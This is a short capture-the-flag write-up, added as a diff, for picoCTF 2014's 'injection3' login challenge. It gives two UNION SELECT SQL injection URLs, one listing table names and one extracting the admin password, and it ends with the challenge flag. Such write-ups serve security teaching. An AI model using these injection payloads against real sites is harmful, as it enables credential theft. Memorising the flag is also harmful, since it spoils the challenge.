@@ -1,0 +1,17 @@
+Problem:
+
+Daedalus Corp. has increased the security of their login prompt. Is it possible to work around their new defenses?
+
+Notes:
+
+Need to find out table prefix name
+
+http://web2014.picoctf.com/injection3/lookup_user.php?id=1000%20UNION%20SELECT%201,2,3,4,5,6,group_concat(table_name)%20from%20information_schema.tables&debug=1
+
+Then use it in a statement to find the password of the admin
+
+http://web2014.picoctf.com/injection3/lookup_user.php?id=1000 UNION SELECT 1,2,3,4,5,6,password from super_secret_users where id=1&debug=1
+
+Flag:
+
+flag_2tc7ZPa5PEhcyZJXgH
